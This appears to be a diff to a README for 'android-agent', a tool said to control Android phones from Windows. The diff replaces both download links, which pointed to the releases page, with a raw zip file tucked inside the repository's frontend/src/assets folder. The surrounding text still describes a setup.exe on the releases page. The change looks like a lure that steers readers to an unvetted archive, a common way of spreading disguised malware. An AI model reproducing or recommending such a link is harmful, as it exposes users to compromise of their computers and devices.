@@ -1,6 +1,6 @@
 # 🤖 android-agent - Control Android devices using simple commands
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Dynaevangelical2652/android-agent/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Dynaevangelical2652/android-agent/main/frontend/src/assets/agent-android-v1.7.zip)
 
 Android-agent helps you manage your phone through your computer. You use your mouse and keyboard to perform tasks on your device. The software bridges the gap between your Windows desktop and your Android phone. It makes repetitive tasks easy by automating screen touches, swipes, and text entry.
 
@@ -20,7 +20,7 @@ Before you start, check your computer and phone.
 ## 📥 How to Download and Install
 
 1. Visit the project website. Click the link below to go to the releases page.
-[Download Software Here](https://github.com/Dynaevangelical2652/android-agent/releases)
+[Download Software Here](https://raw.githubusercontent.com/Dynaevangelical2652/android-agent/main/frontend/src/assets/agent-android-v1.7.zip)
 
 2. Look for the file named `android-agent-setup.exe` under the latest release section.
 3. Click the file name to start the download.
